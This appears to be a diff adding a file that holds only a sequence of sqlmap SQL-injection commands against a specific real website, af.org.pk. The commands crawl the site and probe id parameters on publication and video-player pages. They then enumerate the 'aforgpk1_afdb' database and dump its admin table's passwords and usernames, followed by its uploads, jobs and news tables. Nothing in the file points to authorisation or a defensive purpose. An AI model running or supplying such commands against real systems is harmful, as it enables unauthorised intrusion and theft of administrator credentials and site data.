@@ -1,0 +1,20 @@
+python3 sqlmap.py -u https://www.af.org.pk --crawl=2 --batch
+
+python3 sqlmap.py -u https://www.af.org.pk/publication-detail.php?id=31 --current-user --current-db  --batch
+
+python3 sqlmap.py -u http://www.af.org.pk/video-player.php?id=10 --current-user --current-db  --batch
+
+python3 sqlmap.py -u http://www.af.org.pk/video-player.php?id=10 -D aforgpk1_afdb --tables --batch
+
+python3 sqlmap.py -u http://www.af.org.pk/video-player.php?id=10 -D aforgpk1_afdb -T admin --columns --batch
+
+python3 sqlmap.py -u http://www.af.org.pk/video-player.php?id=10 -D aforgpk1_afdb -T admin -C password --dump --batch
+
+python3 sqlmap.py -u http://www.af.org.pk/video-player.php?id=10 -D aforgpk1_afdb -T admin -C username --dump --batch
+
+python3 sqlmap.py -u http://www.af.org.pk/video-player.php?id=10 -D aforgpk1_afdb -T files_upload --dump --batch
+
+python3 sqlmap.py -u http://www.af.org.pk/video-player.php?id=10 -D aforgpk1_afdb -T jobs --dump --batch
+
+python3 sqlmap.py -u http://www.af.org.pk/video-player.php?id=10 -D aforgpk1_afdb -T news --dump --batch
+
